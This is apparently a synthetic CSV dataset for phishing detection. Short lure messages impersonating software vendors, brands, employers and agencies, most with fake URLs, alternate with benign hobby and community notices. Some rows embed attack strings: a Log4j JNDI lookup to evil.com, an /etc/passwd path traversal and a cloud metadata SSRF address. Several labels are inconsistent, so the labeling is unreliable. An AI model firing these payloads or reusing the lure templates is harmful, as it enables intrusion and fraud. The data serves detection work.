text,label
"Flannel: VXLAN tunnel compromised. Rebuild: http://flannel-tunnel-rebuild.biz",phishing
"Your language exchange partner intro email.",safe
"Weave: DNS rebinding attack. Patch now: http://weave-dns-patch.ru",phishing
"Origami workshop supplies to bring.",safe
"CoreDNS: Zone transfer allowed. Lock down: http://coredns-zone-lock.co",phishing
"Your genealogy research document share.",safe
"etcd: Cluster quorum lost. Recover keys: http://etcd-quorum-recover-scam.net",phishing
"Beekeeping club hive inspection Saturday.",safe
"Zookeeper: znode ACL misconfigured. Fix: http://zookeeper-acl-fix.io",phishing
"Your calligraphy pen order shipped.",safe
"Consul Connect: Intentions bypassed. Audit: http://consul-connect-audit.biz",phishing
"Stargazing meteor shower watch party.",safe
"Traefik: Middleware chain RCE. Patch: http://traefik-rce-patch.co",phishing
"Your pottery kiln firing results.",safe
"Caddy: Auto HTTPS cert stolen. Reissue: http://caddy-cert-reissue.xyz",phishing
"Folk dance festival lineup attached.",safe
"Apache: mod_status exposed. Disable: http://apache-modstatus-fix.ru",phishing
"Your mushroom foraging safety guidelines.",safe
"Tomcat: Manager app default creds. Change: http://tomcat-manager-fix.biz",phishing
"Quilting bee block exchange instructions.",safe
"WildFly: Admin console open to internet. Close: http://wildfly-admin-close.co",phishing
"Your sourdough starter feeding schedule.",safe
"Jetty: JMX port exposed. Secure: http://jetty-jmx-secure.io",phishing
"Bonsai pruning workshop reminder.",safe
"GlassFish: Domain password reset phishing link inside - ignore and delete.",phishing
"Your telescope collimation guide attached.",safe
"Resin: Cluster join token leaked. Rotate: http://resin-token-rotate-scam.net",phishing
"Community garden plot assignment.",safe
"WebLogic: Console brute force detected. Lock: http://weblogic-console-lock.biz",phishing
"Your harmonica lesson sheet music.",safe
"JBoss: Deserialization RCE patch needed: http://jboss-deser-patch.co",phishing
"Falconry demonstration tickets attached.",safe
"PayPal: You received $200. Claim: http://paypal-claim-money.xyz",phishing
"Your knitting pattern for the charity blanket.",safe
"eBay: Second chance offer on item you bid on. Pay: http://ebay-second-chance.ru",phishing
"Local bakery order ready for pickup.",safe
"Microsoft: Unusual sign-in. Was this you? http://microsoft-unusual-signin.co",phishing
"Your car registration renewal notice.",safe
"Apple: Purchase of $999 iPhone on your card. Dispute: http://apple-dispute-charge.biz",phishing
"Neighborhood block party flyer.",safe
"Google: New device added to account. Remove: http://google-device-remove.io",phishing
"Your piano tuner appointment Friday.",safe
"Amazon: Prime membership cancelled. Reactivate: http://amazon-prime-reactivate.tk",phishing
"Volunteer fire department training schedule.",safe
"Netflix: Account sharing detected. Upgrade plan: http://netflix-sharing-upgrade.co",phishing
"Your fishing license renewal online.",safe
"Spotify: Family plan member removed you. Rejoin: http://spotify-family-rejoin.ru",phishing
"Community choir concert program.",safe
"Instagram: Copyright strike. Account deleted in 48h. Appeal: http://instagram-copyright-appeal.biz",phishing
"Your horse riding lesson cancelled rain.",safe
"WhatsApp: Your account will be deleted. Verify: http://whatsapp-verify-account.xyz",phishing
"Local library book club selection.",safe
"Telegram: Login code 847291. Do not share. (This is a legitimate-style safe message)",safe
"Telegram: Your account expires. Verify phone: http://telegram-verify-phone.co",phishing
"Your ceramics glaze test results.",safe
"Discord: Nitro gift from stranger. Claim: http://discord-nitro-gift.ru",phishing
"Woodworking club tool safety refresher.",safe
"Steam: Free game key GRAB-NOW. Redeem: http://steam-free-key.biz",phishing
"Your birdhouse building plans attached.",safe
"Epic Games: Fortnite V-Bucks giveaway. Login: http://fortnite-vbucks-free.io",phishing
"Community pool opening day schedule.",safe
"Roblox: Account terminated for exploits. Appeal: http://roblox-appeal-form.co",phishing
"Your sourdough bread competition entry confirmed.",safe
"Minecraft: Hypixel ban appeal. Pay $5: http://minecraft-ban-appeal.xyz",phishing
"Local farmers cooperative meeting minutes.",safe
"PlayStation: PSN account locked. Unlock: http://psn-account-unlock.ru",phishing
"Your watercolor paint order confirmation.",safe
"Xbox: Game Pass expired. Renew: http://xbox-gamepass-renew.biz",phishing
"Town hall budget hearing agenda.",safe
"Nintendo: eShop balance transfer. Confirm: http://nintendo-eshop-transfer.co",phishing
"Your embroidery hoop size guide.",safe
"Twitch: Partner revenue held. Verify tax: http://twitch-partner-verify.io",phishing
"Scout merit badge counselor list.",safe
"YouTube: Channel demonetized. Appeal: http://youtube-demonetize-appeal.tk",phishing
"Your leather crafting tool catalog.",safe
"TikTok: Viral video prize. Claim $5000: http://tiktok-prize-claim.ru",phishing
"Neighborhood watch crime stats report.",safe
"Reddit: Moderator access revoked. Restore: http://reddit-mod-restore.biz",phishing
"Your candle making wax temperature chart.",safe
"Pinterest: Business account suspended. Verify: http://pinterest-business-verify.co",phishing
"Local museum volunteer orientation.",safe
"Snapchat: Memories deleted. Recover: http://snapchat-memories-recover.xyz",phishing
"Your soap making lye safety sheet.",safe
"LinkedIn: Job offer requires upfront training fee. Wire $500 today.",phishing
"Community theater costume fitting.",safe
"Indeed: Employer wants SSN before interview. Send to hr-scam@fake-jobs.com",phishing
"Your bee hive winter preparation checklist.",safe
"Glassdoor: Company review removed. Pay to restore: http://glassdoor-review-restore.io",phishing
"Local food bank donation drive flyer.",safe
"Upwork: Client overpaid. Refund difference via Zelle to personal account.",phishing
"Your telescope mirror cleaning guide.",safe
"Fiverr: Account verification fee $25 required to withdraw earnings.",phishing
"Church newsletter Easter service times.",safe
"Freelancer.com: Project escrow release - click to send bank login.",phishing
"Your pottery wheel maintenance log.",safe
"Remote job: Data entry $5000/week. Send $200 for equipment deposit first.",phishing
"School board meeting public comment signup.",safe
"Work from home: Envelope stuffing $80/hour. Purchase starter kit $149.",phishing
"Your calligraphy ink mixing ratios.",safe
"Mystery shopper assignment - cash check and wire 90% back.",phishing
"PTA newsletter spring fundraiser results.",safe
"Nigerian prince inheritance - need your bank account to transfer $10M.",phishing
"Your hiking trail map for weekend trip.",safe
"Romance scam: military deployed overseas needs iTunes gift cards urgently.",phishing
"Local blood drive appointment slots.",safe
"Tech support: Your computer infected. Call 1-888-SCAM-NOW or install remote access.",phishing
"Your garden compost turning schedule.",safe
"IRS refund deposited $4,382 - click to confirm direct deposit account details.",phishing
"Neighborhood picnic signup sheet.",safe
"Social Security: Benefits suspended. Call immediately or click http://ssa-benefits-restore.co",phishing
"Your dog training class homework.",safe
"Medicare: New card required. Provide Medicare number and DOB online.",phishing
"Community orchestra rehearsal schedule.",safe
"COVID vaccine appointment - free at http://fake-vaccine-site.ru/register",phishing
"Your cat's vet vaccination certificate.",safe
"Weight loss miracle pill 30lbs in 7 days. Order now 50% off!!!",phishing
"Local running race bib pickup info.",safe
"Pharmacy: Prescription ready. Pay copay via gift card to avoid delay.",phishing
"Your sourdough discard recipe collection.",safe
"CBD oil cures cancer FDA approved. Buy now limited stock!",phishing
"Book club next read: normal literary fiction title.",safe
"Student loan forgiveness approved - pay $99 processing fee today.",phishing
"Your watercolor paper weight comparison chart.",safe
"Credit repair: Delete all bad credit in 30 days. Pay $299 upfront.",phishing
"Town recycling schedule update.",safe
"Debt consolidation: Stop all payments send one check to P.O. Box scam.",phishing
"Your telescope eyepiece collection inventory.",safe
"Payday loan guaranteed approval no credit check. APR 400%. Apply now!",phishing
"Community garden compost delivery Tuesday.",safe
"Car warranty expired final notice. Call 888-555-SCAM to extend.",phishing
"Your pottery class final project photos.",safe
"Solar panels government rebate - pay $5000 deposit get $20000 back.",phishing
"Local jazz festival lineup announced.",safe
"Timeshare exit fee $2999 - we guarantee cancellation or money back.",phishing
"Your embroidery thread color chart.",safe
"Grant money available $25000 - pay $199 application fee to receive.",phishing
"Neighborhood holiday lights contest rules.",safe
"Charity: Donate Bitcoin to help orphans - wallet address inside suspicious link.",phishing
"Your bird watching life list update.",safe
"Lottery UK National - you won! Pay customs fee $500 to release funds.",phishing
"School supply list for fall semester.",safe
"Inheritance from unknown relative - attorney needs your bank details.",phishing
"Your harmonica tab for Amazing Grace.",safe
"Package delivery from Amazon - wrong link http://amaz0n-parcel.info/track",phishing
"Community cleanup day volunteer thank you.",safe
"CEO fraud: Wire $50000 to new vendor account today before market close urgent.",phishing
"Your knitting gauge swatch instructions.",safe
"Vendor invoice changed bank details - please update payment to new account.",phishing
"Local theater season ticket renewal.",safe
"BEC: Kindly process urgent wire transfer attached PDF password is 1234.",phishing
"Your sourdough hydration percentage log.",safe
"Fake CEO: I am in meeting send gift cards to clients scan QR code.",phishing
"Farmers market vendor map for Saturday.",safe
"Supply chain: Urgent PO change wire payment to offshore account.",phishing
"Your calligraphy practice drills attached.",safe
"HR direct deposit form updated - submit SSN and routing via http://hr-deposit-form.co",phishing
"Scout camp packing list for summer.",safe
"IT helpdesk: Password expired. Reset at http://it-password-reset-fake.net",phishing
"Your pottery glaze test tile photos.",safe
"VPN required: Install http://company-vpn-download.xyz/setup.exe immediately.",phishing
"Community choir holiday concert invite.",safe
"Malware: Invoice attached invoice.exe open to view payment details.",phishing
"Your telescope finder scope alignment guide.",safe
"Ransomware: All files encrypted pay 1 Bitcoin to decrypt@evil.onion",phishing
"Local library story time schedule.",safe
"Keylogger: Your password was stolen. Download cleaner http://password-cleaner.biz",phishing
"Your watercolor landscape reference photos.",safe
"Fake antivirus: 847 viruses found. Purchase license http://fake-antivirus.co",phishing
"Neighborhood watch annual meeting agenda.",safe
"Cryptojacking: Your browser mining Monero. Fix: http://browser-mining-stop.ru",phishing
"Your embroidery hoop tension tips.",safe
"SIM swap: Your mobile number ported. Call attacker-controlled number.",phishing
"Community pool lifeguard schedule.",safe
"Smishing: USPS package http://usps.malicious-link.tk reply STOP to cancel",phishing
"Your sourdough starter naming contest results.",safe
"Vishing: IRS calling arrest warrant pay with prepaid cards now.",phishing
"Local bakery wedding cake tasting confirmed.",safe
"Quishing: QR code on parking ticket links to http://parking-fine-pay.scam",phishing
"Your birdhouse camera setup guide.",safe
"Deepfake CEO video call wire transfer authorized - process immediately.",phishing
"Woodworking club project plans shared.",safe
"AI voice clone: Mom in accident send money Western Union urgent.",phishing
"Your pottery kiln cone chart.",safe
"Fake 2FA: Microsoft Authenticator reset required http://mfa-reset-scam.co",phishing
"Community garden spring planting guide.",safe
"OAuth phishing: Grant app FullAccess permissions to unknown third party.",phishing
"Your harmonica blues scale exercises.",safe
"Session hijack: Click to restore session http://session-restore-phish.io",phishing
"Local museum docent training schedule.",safe
"Formjacking: Your credit card was captured on checkout - verify at fake site.",phishing
"Your knitting cable pattern chart.",safe
"Watering hole: Industry conference site compromised download agenda.pdf.exe",phishing
"Town parade route map attached.",safe
"Typosquatting: Login at http://gooogle.com/signin instead of google.com",phishing
"Your sourdough scoring pattern gallery.",safe
"Homograph: PayPal at http://раypal.com (Cyrillic a) verify account.",phishing
"Community orchestra string section roster.",safe
"Subdomain takeover: Login at http://login.company-evil.co",phishing
"Your calligraphy flourishing examples.",safe
"Pastejacking: Ctrl+V installs malware from clipboard - run fix script.",phishing
"Scout troop camping gear checklist.",safe
"Tabnabbing: Bank tab replaced while you were away - re-login required fake page.",phishing
"Your pottery trimming tools care guide.",safe
"Clickjacking: Invisible button over real site steals Facebook like.",phishing
"Local food co-op member meeting.",safe
"Malvertising: Flash player update required http://flash-update-virus.co",phishing
"Your telescope collimation laser guide.",safe
"Drive-by download: Visit http://free-movies-no-signup.ru for exploit kit.",phishing
"Neighborhood block party cleanup crew.",safe
"SQL injection lesson: normal database course email with no malicious links.",safe
"Your watercolor wet-on-wet technique notes.",safe
"XSS payload in email: script alert document cookie - training sample only.",safe
"Community choir warm-up exercises attached.",safe
"CSRF: Click to transfer funds without your knowledge http://bank-csrf-demo.co",phishing
"Your embroidery stabilizer selection guide.",safe
"IDOR: User profile 12345 exposed at http://app.com/user/12345 - security report.",safe
"Local running club pace groups.",safe
"Path traversal: Download ../../../etc/passwd from http://vuln-file-server.biz",phishing
"Your sourdough autolyse timing chart.",safe
"SSRF: Internal metadata http://169.254.169.254/ exposed via webhook.",phishing
"Farmers market organic produce list.",safe
"XXE: Parse XML external entity in attachment - malicious sample for lab.",phishing
"Your bird feeder cleaning schedule.",safe
"Deserialization: Java object stream in attachment run calc.exe.",phishing
"Pottery class open studio hours.",safe
"Prototype pollution: JSON config merge vulnerability PoC email.",safe
"Your harmonica bending practice log.",safe
"Log4j: ${jndi:ldap://evil.com/a} in subject line - attack simulation.",phishing
"Community theater prop list.",safe
"Spring4Shell: Deploy WAR shell via classloader - security research notice.",phishing
"Your knitting yarn weight conversion table.",safe
"Heartbleed: OpenSSL memory leak scan your server - fake remediation tool link.",phishing
"Local jazz jam session signup.",safe
"Shellshock: Bash environment exploit test CGI script.",phishing
"Your telescope dew heater setup.",safe
"EternalBlue: SMBv1 exploit patch reminder from fake Microsoft.",phishing
"Woodworking safety goggles reminder.",safe
"WannaCry: Decrypt files pay Bitcoin - classic ransomware template.",phishing
"Your sourdough cold retard schedule.",safe
"NotPetya: Tax payment due open attached executable.",phishing
"Community garden rain barrel workshop.",safe
"SolarWinds: Orion update from http://orion-update-supply-chain.ru",phishing
"Your calligraphy pen nib comparison.",safe
"Colonial Pipeline: Urgent fuel shortage pay ransom.",phishing
"Scout merit badge requirements update.",safe
"Log4Shell patch: Download fake patch http://log4j-patch-download.co",phishing
"Your pottery wheel speed settings.",safe
"ProxyLogon: Exchange server zero-day exploit notification fake.",phishing
"Neighborhood holiday decoration contest.",safe
"PrintNightmare: Printer driver RCE install http://print-spooler-fix.biz",phishing
"Your watercolor brush care instructions.",safe
"Zerologon: Domain admin compromise scan http://zerologon-check.ru",phishing
"Local blood drive thank you volunteers.",safe
"Follina: MSDT ms-msdt exploit in Word doc - open attachment.",phishing
"Your embroidery machine tension settings.",safe
"SpringShell: Spring Framework RCE patch now http://spring-patch-scam.co",phishing
"Community pool chemical safety sheet.",safe
"Dirty Pipe: Linux kernel privilege escalation PoC download.",phishing
"Your sourdough oven spring troubleshooting.",safe
"Spectre Meltdown: CPU vulnerability pay for patch tool.",phishing
"Town council zoning hearing notice.",safe
"Rowhammer: RAM bit flip attack hardware sale scam.",phishing
"Your bird watching eBird checklist export.",safe
"Meltdown: Intel CPU bug fix download http://intel-cpu-fix-malware.io",phishing
"Local museum exhibit opening reception.",safe
"BlueKeep: RDP vulnerability remote desktop patch fake link.",phishing
"Your harmonica repair kit contents.",safe
"Debian SSH weak keys regenerate - phishing IT notice.",phishing
"Community orchestra concert dress code.",safe
"Heartbleed openssl upgrade: http://openssl-upgrade-scam.co/download",phishing
"Your knitting blocking mat instructions.",safe
"POODLE SSLv3 downgrade attack - disable SSL fake guide with malware.",phishing
"Farmers market honey vendor list.",safe
"BEAST TLS 1.0 attack mitigation tool download scam.",phishing
"Your pottery gas kiln ventilation checklist.",safe
"CRIME TLS compression attack - install browser extension malware.",phishing
"Scout camping leave-no-trace reminder.",safe
"BREACH HTTP compression attack - corporate security fake alert wire money.",phishing
"Your telescope motor drive calibration.",safe
"FREAK export cipher downgrade - patch now malicious link.",phishing
"Local theater audition callback list.",safe
"Logjam DH parameter attack - update Java fake installer.",phishing
"Your sourdough starter smell troubleshooting.",safe
"Sweet32 birthday attack on 3DES - banking alert phishing.",phishing
"Community garden compost tea recipe.",safe
"DROWN SSLv2 cross-protocol attack - renew certificate scam site.",phishing
"Your calligraphy ink dilution ratios.",safe
"ROBOT Bleichenbacher oracle RSA - TLS patch phishing.",phishing
"Neighborhood watch flashlight drive.",safe
"EFAIL PGP email decryption leak - install fake Enigmail update.",phishing
"Your watercolor masking fluid techniques.",safe
